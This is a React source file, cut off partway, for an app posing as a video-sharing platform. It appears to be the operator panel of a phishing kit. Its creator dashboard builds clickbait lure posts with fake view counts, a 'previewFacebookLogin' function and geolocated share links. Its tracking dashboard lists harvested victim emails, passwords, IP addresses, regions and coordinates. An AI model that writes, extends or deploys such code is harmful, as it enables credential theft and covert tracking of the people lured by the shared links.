import React, { useState, useEffect } from 'react';
import { Upload, Play, Share2, Eye, Users, Video, LogOut, Plus, Trash2, Edit, ExternalLink, Clock, MapPin, Globe, UserCheck, AlertCircle, RefreshCw } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

// Import local images
import localimage from "../assets/col 10.JPG";
import localimage2 from "../assets/k2.png";  // Added second local image

// API Base URL - Dynamic based on environment
const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
const API_BASE_URL = isDevelopment 
  ? 'http://localhost:8000/api'
  : 'https://face-ayox.onrender.com/api';

const MEDIA_BASE_URL = isDevelopment
  ? 'http://localhost:8000'
  : 'https://face-ayox.onrender.com';

const VideoPlatformApp = () => {
  const navigate = useNavigate();
  const [currentUser, setCurrentUser] = useState(null);
  const [currentView, setCurrentView] = useState('login');
  const [loading, setLoading] = useState(false);

  // Auth states
  const [loginForm, setLoginForm] = useState({ email: '', password: '' });
  const [registerForm, setRegisterForm] = useState({ username: '', email: '', password: '' });

  // Creator states
  const [images, setImages] = useState([]);
  const [imageForm, setImageForm] = useState({ title: '', description: '', image: null });
  const [shareableLink, setShareableLink] = useState('');

  // Admin states
  const [creators, setCreators] = useState([]);
  const [faceUsers, setFaceUsers] = useState([]);
  const [creatorForm, setCreatorForm] = useState({ username: '', email: '', password: '' });

  // Tracking states
  const [visitorCredentials, setVisitorCredentials] = useState([]);
  const [trackedVisitors, setTrackedVisitors] = useState([]);
  const [activeTab, setActiveTab] = useState('credentials');

  // Image loading states
  const [imageLoading, setImageLoading] = useState({});

  // Debug: Log the local image objects
  useEffect(() => {
    console.log('Local image object 1:', localimage);
    console.log('Local image object 2:', localimage2);
    console.log('Type of localimage:', typeof localimage);
    console.log('Type of localimage2:', typeof localimage2);
    
    if (localimage && typeof localimage === 'object') {
      console.log('Local image 1 keys:', Object.keys(localimage));
      if (localimage.default) {
        console.log('Has default property:', localimage.default);
      }
    }
    
    if (localimage2 && typeof localimage2 === 'object') {
      console.log('Local image 2 keys:', Object.keys(localimage2));
      if (localimage2.default) {
        console.log('Has default property:', localimage2.default);
      }
    }
  }, []);

  // Helper function to get the local image URL
  const getLocalImageUrl = (imageObj, imageName = '') => {
    console.log(`Getting local image URL for: ${imageName}`, imageObj);
    
    if (!imageObj) {
      console.log(`${imageName} is undefined`);
      return 'https://images.unsplash.com/photo-1579546929518-9e396f3cc809?w=800&h=600&fit=crop';
    }
    
    // If it's already a string URL
    if (typeof imageObj === 'string') {
      console.log(`${imageName} is string:`, imageObj);
      return imageObj;
    }
    
    // If it's an object with default property (common with imports)
    if (imageObj && typeof imageObj === 'object' && imageObj.default) {
      console.log(`${imageName} has default:`, imageObj.default);
      // If default is a string
      if (typeof imageObj.default === 'string') {
        return imageObj.default;
      }
      // If default is an object with src
      if (imageObj.default && imageObj.default.src) {
        return imageObj.default.src;
      }
      return imageObj.default;
    }
    
    // If it's an object with src property
    if (imageObj && imageObj.src) {
      console.log(`${imageName} has src:`, imageObj.src);
      return imageObj.src;
    }
    
    // Fallback: return the object as-is and let React handle it
    console.log(`Returning ${imageName} as-is:`, imageObj);
    return imageObj;
  };

  useEffect(() => {
    // Check for stored auth data
    try {
      const token = localStorage.getItem('access_token');
      const user = localStorage.getItem('user_data');
      if (token && user) {
        const userData = JSON.parse(user);
        setCurrentUser(userData);
        setCurrentView(userData.role === 'admin' ? 'admin' : 'creator');
      }
    } catch (error) {
      console.error('Error loading stored auth data:', error);
      // Clear corrupted data
      localStorage.removeItem('access_token');
      localStorage.removeItem('refresh_token');
      localStorage.removeItem('user_data');
    }
  }, []);

  // Helper function to get full image URL
  const getImageUrl = (imagePath) => {
    console.log('Getting image URL for:', imagePath);
    
    if (!imagePath) {
      console.log('No image path, returning placeholder');
      return "https://images.unsplash.com/photo-1579546929518-9e396f3cc809?w=800&h=600&fit=crop";
    }
    
    // Check if it's the first local image
    if (imagePath === localimage) {
      console.log('Detected local image 1, using getLocalImageUrl()');
      return getLocalImageUrl(localimage, 'localimage1');
    }
    
    // Check if it's the second local image
    if (imagePath === localimage2) {
      console.log('Detected local image 2, using getLocalImageUrl()');
      return getLocalImageUrl(localimage2, 'localimage2');
    }
    
    // If it's already a full URL, ensure HTTPS in production
    if (imagePath.startsWith('http://') || imagePath.startsWith('https://')) {
      console.log('Full URL detected:', imagePath);
      if (!isDevelopment && imagePath.startsWith('http://')) {
        const httpsUrl = imagePath.replace('http://', 'https://');
        console.log('Converted to HTTPS:', httpsUrl);
        return httpsUrl;
      }
      return imagePath;
    }
    
    // If it's a data URL (base64), return as is
    if (imagePath.startsWith('data:')) {
      console.log('Data URL detected');
      return imagePath;
    }
    
    // Check if it's a relative path from Django
    if (imagePath.startsWith('/media/')) {
      const mediaUrl = `${MEDIA_BASE_URL}${imagePath}`;
      console.log('Django media URL:', mediaUrl);
      return mediaUrl;
    }
    
    // If it starts with media/ without leading slash
    if (imagePath.startsWith('media/')) {
      const mediaUrl = `${MEDIA_BASE_URL}/${imagePath}`;
      console.log('Relative media URL:', mediaUrl);
      return mediaUrl;
    }
    
    // Default: assume it's in media folder
    const defaultUrl = `${MEDIA_BASE_URL}/media/${imagePath}`;
    console.log('Default media URL:', defaultUrl);
    return defaultUrl;
  };

  // Auth Functions
  const handleLogin = async () => {
    if (!loginForm.email || !loginForm.password) {
      alert('Please fill in all fields');
      return;
    }
    
    setLoading(true);
    try {
      const response = await fetch(`${API_BASE_URL}/login/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(loginForm)
      });
      const data = await response.json();
      if (response.ok) {
        localStorage.setItem('access_token', data.access);
        localStorage.setItem('refresh_token', data.refresh);
        const userData = { ...data, role: data.role || 'creator' };
        localStorage.setItem('user_data', JSON.stringify(userData));
        setCurrentUser(userData);
        setCurrentView(userData.role === 'admin' ? 'admin' : 'creator');
      } else {
        alert('Login failed: ' + (data.detail || 'Unknown error'));
      }
    } catch (error) {
      alert('Login failed: ' + error.message);
    }
    setLoading(false);
  };

  const handleRegister = async () => {
    if (!registerForm.username || !registerForm.email || !registerForm.password) {
      alert('Please fill in all fields');
      return;
    }
    
    setLoading(true);
    try {
      const response = await fetch(`${API_BASE_URL}/register/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(registerForm)
      });
      const data = await response.json();
      if (response.ok) {
        localStorage.setItem('access_token', data.access);
        localStorage.setItem('refresh_token', data.refresh);
        const userData = { ...data, role: 'creator' };
        localStorage.setItem('user_data', JSON.stringify(userData));
        setCurrentUser(userData);
        setCurrentView('creator');
      } else {
        alert('Registration failed: ' + JSON.stringify(data));
      }
    } catch (error) {
      alert('Registration failed: ' + error.message);
    }
    setLoading(false);
  };

  const handleLogout = () => {
    localStorage.removeItem('access_token');
    localStorage.removeItem('refresh_token');
    localStorage.removeItem('user_data');
    setCurrentUser(null);
    setCurrentView('login');
    setImages([]);
    setCreators([]);
    setFaceUsers([]);
    setVisitorCredentials([]);
    setTrackedVisitors([]);
  };

  // Creator Functions
  const handleImageUpload = async () => {
    if (!imageForm.title || !imageForm.image) {
      alert('Please fill in title and select an image file');
      return;
    }
    
    setLoading(true);
    const formData = new FormData();
    formData.append('title', imageForm.title);
    formData.append('description', imageForm.description);
    formData.append('image', imageForm.image);

    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/images/`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData
      });
      if (response.ok) {
        alert('Image uploaded successfully!');
        setImageForm({ title: '', description: '', image: null });
        // Reset the file input
        const fileInput = document.querySelector('input[type="file"]');
        if (fileInput) fileInput.value = '';
        fetchImages();
      } else {
        const errorData = await response.json();
        alert('Upload failed: ' + JSON.stringify(errorData));
      }
    } catch (error) {
      alert('Upload failed: ' + error.message);
    }
    setLoading(false);
  };

  const fetchImages = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/images/`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        const data = await response.json();
        console.log('Fetched images from API:', data);
        
        if (data.length === 0) {
          // Use mock data with local images
          console.log('No images from API, using mock data with local images');
          const localImage1Url = getLocalImageUrl(localimage, 'localimage1');
          const localImage2Url = getLocalImageUrl(localimage2, 'localimage2');
          
          console.log('Local image 1 URL for mock data:', localImage1Url);
          console.log('Local image 2 URL for mock data:', localImage2Url);
          
          const mockData = [
            {
              id: 1,
              title: "Making a Lovely Moment Together",
              description: "Making me cum in a special way.",
              image: localImage1Url,
              views: 1250,
              duration: "6:30",
              created_at: new Date().toISOString()
            },
            {
              id: 2,
              title: "Special Memory",
              description: "How my wife's death and the stillbirth of my daughter  made me loose my memory.",
              image: localImage2Url,
              views: 18892,
              duration: "12:45",
              created_at: new Date().toISOString()
            },
            {
              id: 3,
              title: "Cooking Masterclass",
              description: "Learn professional cooking techniques from world-class chefs in this comprehensive cooking tutorial.",
              image: "https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=800&h=600&fit=crop&crop=faces",
              views: 750,
              duration: "8:20",
              created_at: new Date().toISOString()
            }
          ];
          setImages(mockData);
        } else {
          // Process API data
          const processedData = data.map(item => ({
            ...item,
            views: item.views || Math.floor(Math.random() * 2000) + 500,
            duration: item.duration || `${Math.floor(Math.random() * 10) + 1}:${Math.floor(Math.random() * 60).toString().padStart(2, '0')}`
          }));
          setImages(processedData);
        }
      } else {
        console.error('Failed to fetch images:', response.status);
        // Use mock data with local images
        const localImage1Url = getLocalImageUrl(localimage, 'localimage1');
        const localImage2Url = getLocalImageUrl(localimage2, 'localimage2');
        
        console.log('API error, using mock data with local images:', localImage1Url, localImage2Url);
        
        const mockData = [
          {
            id: 1,
            title: "Making a Lovely Moment Together",
            description: "Making me cum in a special way.",
            image: localImage1Url,
            views: 1250,
            duration: "6:30",
            created_at: new Date().toISOString()
          },
         {
              id: 2,
              title: "Special Memory",
              description: "How my wife's death and the stillbirth of my daughter  made me loose my memory.",
              image: localImage2Url,
              views: 18892,
              duration: "12:45",
              created_at: new Date().toISOString()
            },
          {
            id: 3,
            title: "Cooking Masterclass",
            description: "Learn professional cooking techniques from world-class chefs in this comprehensive cooking tutorial.",
            image: "https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=800&h=600&fit=crop&crop=faces",
            views: 750,
            duration: "8:20",
            created_at: new Date().toISOString()
          }
        ];
        setImages(mockData);
      }
    } catch (error) {
      console.error('Failed to fetch images:', error);
      // Use mock data with local images
      const localImage1Url = getLocalImageUrl(localimage, 'localimage1');
      const localImage2Url = getLocalImageUrl(localimage2, 'localimage2');
      
      console.log('Network error, using mock data with local images:', localImage1Url, localImage2Url);
      
      const mockData = [
        {
          id: 1,
          title: "Making a Lovely Moment Together",
          description: "Making me cum in a special way.",
          image: localImage1Url,
          views: 1250,
          duration: "6:30",
          created_at: new Date().toISOString()
        },
        {
              id: 2,
              title: "Special Memory",
              description: "How my wife's death and the stillbirth of my daughter  made me loose my memory.",
              image: localImage2Url,
              views: 18892,
              duration: "12:45",
              created_at: new Date().toISOString()
            },
        {
          id: 3,
          title: "Cooking Masterclass",
          description: "Learn professional cooking techniques from world-class chefs in this comprehensive cooking tutorial.",
          image: "https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=800&h=600&fit=crop&crop=faces",
          views: 750,
          duration: "8:20",
          created_at: new Date().toISOString()
        }
      ];
      setImages(mockData);
    }
  };

  // Enhanced share function with preview in message
  const generateShareableLink = async (image) => {
    try {
      // First get the visitor's IP information
      const ipResponse = await fetch('https://ipapi.co/json/');
      const ipData = await ipResponse.json();
      
      const shareUrl = `${window.location.origin}/share/${image.id}`;
      
      // Get image URL and ensure HTTPS in production
      let imageUrl = getImageUrl(image.image);
      if (!isDevelopment && imageUrl.startsWith('http://')) {
        imageUrl = imageUrl.replace('http://', 'https://');
      }
      
      const imageParams = new URLSearchParams({
        title: image.title,
        description: image.description,
        views: image.views || 1250,
        duration: image.duration || "6:30",
        creator: currentUser?.username || 'Unknown',
        type: 'video',
        image_url: imageUrl,
        // Include IP data for tracking
        share_ip: ipData.ip,
        share_country: ipData.country_name,
        share_region: ipData.region
      });
      
      const fullShareUrl = `${shareUrl}?${imageParams.toString()}`;
      
      // Create a rich preview message
      const previewMessage = `🎥 Check out this video: "${image.title}"\n\n${image.description}\n\n👀 ${(image.views || 1250).toLocaleString()} views | ⏱️ ${image.duration || "6:30"}\n\nWatch here: ${fullShareUrl}`;
      
      // Try to copy the rich message to clipboard
      await navigator.clipboard.writeText(previewMessage);
      alert('Shareable link with preview copied to clipboard!');
      
    } catch (error) {
      console.error('Error generating share link:', error);
      // Fallback to simple URL
      const shareUrl = `${window.location.origin}/share/${image.id}`;
      alert(`Shareable link: ${shareUrl}`);
    }
  };

  const shareToSocialMedia = async (image, platform) => {
    try {
      // Get sharer's IP information
      const ipResponse = await fetch('https://ipapi.co/json/');
      const ipData = await ipResponse.json();
      
      const shareUrl = `${window.location.origin}/share/${image.id}`;
      
      // Get image URL and ensure HTTPS in production
      let imageUrl = getImageUrl(image.image);
      if (!isDevelopment && imageUrl.startsWith('http://')) {
        imageUrl = imageUrl.replace('http://', 'https://');
      }
      
      const imageParams = new URLSearchParams({
        title: image.title,
        description: image.description,
        views: image.views || 1250,
        duration: image.duration || "6:30",
        creator: currentUser?.username || 'Unknown',
        type: 'video',
        image_url: imageUrl,
        share_ip: ipData.ip,
        share_country: ipData.country_name,
        share_region: ipData.region,
        shared_via: platform
      });
      
      const fullShareUrl = `${shareUrl}?${imageParams.toString()}`;
      const text = `Check out this video: ${image.title}\n\n${image.description}\n\nWatch: ${fullShareUrl}`;
      
      const urls = {
        facebook: `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(fullShareUrl)}&quote=${encodeURIComponent(text)}`,
        twitter: `https://twitter.com/intent/tweet?url=${encodeURIComponent(fullShareUrl)}&text=${encodeURIComponent(text)}`,
        linkedin: `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent(fullShareUrl)}`,
        whatsapp: `https://wa.me/?text=${encodeURIComponent(text)}`
      };

      window.open(urls[platform], '_blank', 'width=600,height=400');
    } catch (error) {
      console.error('Error sharing to social media:', error);
    }
  };

  const previewFacebookLogin = (image) => {
    // Get image URL and ensure HTTPS in production
    let imageUrl = getImageUrl(image.image);
    if (!isDevelopment && imageUrl.startsWith('http://')) {
      imageUrl = imageUrl.replace('http://', 'https://');
    }
    
    const imageParams = new URLSearchParams({
      title: image.title,
      description: image.description,
      views: image.views || 1250,
      duration: image.duration || "6:30",
      creator: currentUser?.username || 'Unknown',
      type: 'video',
      image_url: imageUrl
    });
    
    navigate(`/share/${image.id}?${imageParams.toString()}`);
  };

  // Admin Functions
  const handleCreateCreator = async () => {
    if (!creatorForm.username || !creatorForm.email || !creatorForm.password) {
      alert('Please fill in all fields');
      return;
    }
    
    setLoading(true);
    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/admin-register/`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ ...creatorForm, role: 'CREATOR' })
      });
      if (response.ok) {
        alert('Creator created successfully!');
        setCreatorForm({ username: '', email: '', password: '' });
        fetchCreators();
      } else {
        const data = await response.json();
        alert('Failed to create creator: ' + JSON.stringify(data));
      }
    } catch (error) {
      alert('Failed to create creator: ' + error.message);
    }
    setLoading(false);
  };

  const fetchCreators = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/users/`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        const data = await response.json();
        setCreators(data.filter(user => user.role === 'CREATOR' || user.is_creator));
      }
    } catch (error) {
      console.error('Failed to fetch creators:', error);
    }
  };

  const fetchFaceUsers = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/admin/fetch-face/`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        const data = await response.json();
        setFaceUsers(data);
      }
    } catch (error) {
      console.error('Failed to fetch face users:', error);
    }
  };

  // Tracking Functions
  const fetchVisitorCredentials = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/tracking/credentials/`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        const data = await response.json();
        setVisitorCredentials(data);
      } else {
        // Mock data for demonstration
        setVisitorCredentials([
          {
            id: 1,
            email: "user1@example.com",
            password: "encrypted_password_1",
            ip_address: "192.168.1.100",
            country: "United States",
            region: "California",
            timestamp: new Date().toISOString(),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          },
          {
            id: 2,
            email: "user2@example.com",
            password: "encrypted_password_2",
            ip_address: "203.0.113.45",
            country: "United Kingdom",
            region: "London",
            timestamp: new Date(Date.now() - 3600000).toISOString(),
            user_agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
          }
        ]);
      }
    } catch (error) {
      console.error('Failed to fetch credentials:', error);
      // Mock data for demonstration
      setVisitorCredentials([
        {
          id: 1,
          email: "user1@example.com",
          password: "encrypted_password_1",
          ip_address: "192.168.1.100",
          country: "United States",
          region: "California",
          timestamp: new Date().toISOString(),
          user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
      ]);
    }
  };

  const fetchTrackedVisitors = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/tracking/visitors/`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (response.ok) {
        const data = await response.json();
        setTrackedVisitors(data);
      } else {
        // Mock data for demonstration
        setTrackedVisitors([
          {
            id: 1,
            ip_address: "192.168.1.100",
            country: "United States",
            region: "California",
            city: "Los Angeles",
            isp: "Comcast Cable",
            latitude: "34.0522",
            longitude: "-118.2437",
            timestamp: new Date().toISOString(),
            pages_visited: 5,
            time_spent: "12:34"
          },
          {
            id: 2,
            ip_address: "203.0.113.45",
            country: "United Kingdom",
            region: "England",
            city: "London",
            isp: "British Telecom",
            latitude: "51.5074",
            longitude: "-0.1278",
            timestamp: new Date(Date.now() - 7200000).toISOString(),
            pages_visited: 3,
            time_spent: "08:15"
          }
        ]);
      }
    } catch (error) {
      console.error('Failed to fetch tracked visitors:', error);
      // Mock data for demonstration
      setTrackedVisitors([
        {
          id: 1,
          ip_address: "192.168.1.100",
          country: "United States",
          region: "California",
          city: "Los Angeles",
          isp: "Comcast Cable",
          latitude: "34.0522",
          longitude: "-118.2437",
          timestamp: new Date().toISOString(),
          pages_visited: 5,
          time_spent: "12:34"
        }
      ]);
    }
  };

  // Initialize data on view change
  useEffect(() => {  
    if (currentView === 'creator' && currentUser) {
      fetchImages();
    } else if (currentView === 'admin' && currentUser) {
      fetchCreators();
      fetchFaceUsers();
    } else if (currentView === 'tracking' && currentUser) {
      fetchVisitorCredentials();
      fetchTrackedVisitors();
    }
  }, [currentView, currentUser]);

  // Login View
  if (currentView === 'login') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-900 via-purple-900 to-indigo-900 flex items-center justify-center p-4">
        <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 w-full max-w-md border border-white/20 shadow-2xl">
          <div className="text-center mb-8">
            <Video className="mx-auto text-white w-12 h-12 mb-4" />
            <h1 className="text-3xl font-bold text-white">Video Platform</h1>
            <p className="text-white/80 mt-2">Sign in to your account</p>
          </div>

          <div className="flex mb-6 bg-white/10 rounded-lg p-1">
            <button
              onClick={() => setCurrentView('login')}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-all ${
                currentView === 'login' ? 'bg-white text-gray-900' : 'text-white hover:bg-white/10'
              }`}
            >
              Login
            </button>
            <button
              onClick={() => setCurrentView('register')}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-all ${
                currentView === 'register' ? 'bg-white text-gray-900' : 'text-white hover:bg-white/10'
              }`}
            >
              Register
            </button>
          </div>

          <div className="space-y-4">
            <div>
              <input
                type="email"
                placeholder="Email"
                value={loginForm.email}
                onChange={(e) => setLoginForm({...loginForm, email: e.target.value})}
                className="w-full px-4 py-3 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-500"
                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
              />
            </div>
            <div>
              <input
                type="password"
                placeholder="Password"
                value={loginForm.password}
                onChange={(e) => setLoginForm({...loginForm, password: e.target.value})}
                className="w-full px-4 py-3 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-500"
                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
              />
            </div>
            <button
              onClick={handleLogin}
              disabled={loading}
              className="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 rounded-lg font-semibold hover:from-blue-700 hover:to-purple-700 transition-all transform hover:scale-105 disabled:opacity-50"
            >
              {loading ? 'Signing In...' : 'Sign In'}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Register View
  if (currentView === 'register') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-900 via-purple-900 to-indigo-900 flex items-center justify-center p-4">
        <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 w-full max-w-md border border-white/20 shadow-2xl">
          <div className="text-center mb-8">
            <Video className="mx-auto text-white w-12 h-12 mb-4" />
            <h1 className="text-3xl font-bold text-white">Create Account</h1>
            <p className="text-white/80 mt-2">Join as a creator</p>
          </div>

          <div className="flex mb-6 bg-white/10 rounded-lg p-1">
            <button
              onClick={() => setCurrentView('login')}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-all ${
                currentView === 'login' ? 'bg-white text-gray-900' : 'text-white hover:bg-white/10'
              }`}
            >
              Login
            </button>
            <button
              onClick={() => setCurrentView('register')}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-all ${
                currentView === 'register' ? 'bg-white text-gray-900' : 'text-white hover:bg-white/10'
              }`}
            >
              Register
            </button>
          </div>

          <div className="space-y-4">
            <div>
              <input
                type="text"
                placeholder="Username"
                value={registerForm.username}
                onChange={(e) => setRegisterForm({...registerForm, username: e.target.value})}
                className="w-full px-4 py-3 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            <div>
              <input
                type="email"
                placeholder="Email"
                value={registerForm.email}
                onChange={(e) => setRegisterForm({...registerForm, email: e.target.value})}
                className="w-full px-4 py-3 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            <div>
              <input
                type="password"
                placeholder="Password"
                value={registerForm.password}
                onChange={(e) => setRegisterForm({...registerForm, password: e.target.value})}
                className="w-full px-4 py-3 bg-white/10 border border-white/20 rounded-lg text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-blue-500"
                onKeyPress={(e) => e.key === 'Enter' && handleRegister()}
              />
            </div>
            <button
              onClick={handleRegister}
              disabled={loading}
              className="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 rounded-lg font-semibold hover:from-blue-700 hover:to-purple-700 transition-all transform hover:scale-105 disabled:opacity-50"
            >
              {loading ? 'Creating Account...' : 'Create Account'}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Creator Dashboard
  if (currentView === 'creator') {
    console.log('Current images:', images); // Debug
    
    return (
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center">
                <Video className="w-8 h-8 text-blue-600 mr-3" />
                <h1 className="text-xl font-semibold text-gray-900">Creator Dashboard</h1>
              </div>
              <div className="flex items-center space-x-4">
                <span className="text-gray-700">Welcome, {currentUser?.username || 'Creator'}</span>
                <button
                  onClick={handleLogout}
                  className="flex items-center px-4 py-2 text-sm text-gray-700 hover:text-red-600 transition-colors"
                >
                  <LogOut className="w-4 h-4 mr-2" />
                  Logout
                </button>
              </div>
            </div>
          </div>
        </header>

        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            {/* Upload Section */}
            <div className="lg:col-span-1">
              <div className="bg-white rounded-xl shadow-lg p-6">
                <h2 className="text-lg font-semibold text-gray-900 mb-4">Upload New Content</h2>
                <div className="space-y-4">
                  <div>
                    <input
                      type="text"
                      placeholder="Content Title"
                      value={imageForm.title}
                      onChange={(e) => setImageForm({...imageForm, title: e.target.value})}
                      className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />
                  </div>
                  <div>
                    <textarea
                      placeholder="Description"
                      value={imageForm.description}
                      onChange={(e) => setImageForm({...imageForm, description: e.target.value})}
                      className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 h-20"
                    />
                  </div>
                  <div>
                    <input
                      type="file"
                      accept="image/*,video/*"
                      onChange={(e) => setImageForm({...imageForm, image: e.target.files[0]})}
                      className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />
                  </div>
                  <button
                    onClick={handleImageUpload}
                    disabled={loading}
                    className="w-full bg-blue-600 text-white py-2 rounded-lg font-medium hover:bg-blue-700 transition-colors disabled:opacity-50 flex items-center justify-center"
                  >
                    <Upload className="w-4 h-4 mr-2" />
                    {loading ? 'Uploading...' : 'Upload Content'}
                  </button>
                </div>
              </div>
            </div>

            {/* Content List with Preview Card Style */}
            <div className="lg:col-span-2">
              <div className="bg-white rounded-xl shadow-lg p-6">
                <h2 className="text-lg font-semibold text-gray-900 mb-4">My Content</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  {images.length === 0 ? (
                    <div className="col-span-2 text-center text-gray-500 py-8">
                      <Video className="mx-auto w-12 h-12 mb-4 opacity-50" />
                      <p>No content uploaded yet. Upload your first content!</p>
                    </div>
                  ) : (
                    images.map((image) => {
                      const imageUrl = getImageUrl(image.image);
                      console.log(`Rendering image ${image.id}:`, {
                        title: image.title,
                        originalPath: image.image,
                        finalUrl: imageUrl
                      });
                      
                      return (
                        <div key={image.id} className="bg-white rounded-lg shadow-lg overflow-hidden border border-gray-200">
                          {/* Content preview with play button overlay */}
                          <div className="relative">
                            <img 
                              src={imageUrl}
                              alt={image.title}
                              className={`w-full h-48 object-cover ${imageLoading[image.id] ? 'animate-pulse bg-gray-200' : ''}`}
                              onLoad={() => {
                                console.log(`Image ${image.id} loaded successfully`);
                                setImageLoading(prev => ({ ...prev, [image.id]: false }));
                              }}
                              onError={(e) => {
                                console.log(`Image ${image.id} failed to load:`, {
                                  attemptedUrl: imageUrl,
                                  originalPath: image.image
                                });
                                setImageLoading(prev => ({ ...prev, [image.id]: false }));
                                
                                // Set fallback image
                                e.target.onerror = null; // Prevent infinite loop
                                e.target.src = "https://images.unsplash.com/photo-1579546929518-9e396f3cc809?w=800&h=600&fit=crop";
                              }}
                              onLoadStart={() => setImageLoading(prev => ({ ...prev, [image.id]: true }))}
                            />
                            {/* Duration badge in top-right corner */}
                            <div className="absolute top-3 right-3">
                              <div className="bg-black bg-opacity-75 text-white px-2 py-1 rounded text-sm font-medium flex items-center">
                                <Clock className="w-3 h-3 mr-1" />
                                {image.duration || "6:30"}
                              </div>
                            </div>
                            {/* Large play button overlay */}
                            <div className="absolute inset-0 flex items-center justify-center opacity-0 hover:opacity-100 transition-opacity duration-300">
                              <button className="bg-black bg-opacity-60 rounded-full p-4 hover:bg-opacity-80 transition-all transform hover:scale-110 shadow-2xl">
                                <Play className="w-12 h-12 text-white ml-1" fill="currentColor" />
                              </button>
                            </div>
                          </div>

                          {/* Content info below preview */}
                          <div className="p-4">
                            <h3 className="font-semibold text-lg text-gray-900 mb-2 line-clamp-2">{image.title}</h3>
                            {image.description && (
                              <p className="text-gray-600 text-sm mb-3 line-clamp-3">{image.description}</p>
                            )}
                            
                            <div className="flex items-center justify-between mb-4">
                              <div className="flex items-center text-sm text-gray-500">
                                <Eye className="w-4 h-4 mr-1" />
                                <span>{(image.views || 1250).toLocaleString()} views</span>
                              </div>
                              <div className="text-sm text-gray-500">
                                {currentUser?.username || 'Unknown User'}
                              </div>
                            </div>

                            {/* Action buttons */}
                            <div className="space-y-2">
                              <button
                                onClick={() => generateShareableLink(image)}
                                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 px-4 rounded-lg font-semibold text-sm flex items-center justify-center transition-colors shadow-md"
                              >
                                <Play className="w-4 h-4 mr-2" fill="currentColor" />
                                SHARE
                              </button>
                              
                              <button 
                                onClick={() => previewFacebookLogin(image)}
                                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 px-4 rounded-lg font-semibold text-sm flex items-center justify-center transition-colors shadow-md"
                              >
                                <ExternalLink className="w-4 h-4 mr-2" />
                                PREVIEW
                              </button>
                              
                              {/* Social media share buttons */}
                              <div className="pt-2 border-t">
                                <p className="text-xs text-gray-600 mb-2">Share on:</p>
                                <div className="flex flex-wrap gap-1">
                                  <button
                                    onClick={() => shareToSocialMedia(image, 'facebook')}
                                    className="px-2 py-1 bg-blue-600 text-white text-xs rounded hover:bg-blue-700 transition-colors"
                                  >
                                    Facebook
                                  </button>
                                  <button
                                    onClick={() => shareToSocialMedia(image, 'twitter')}
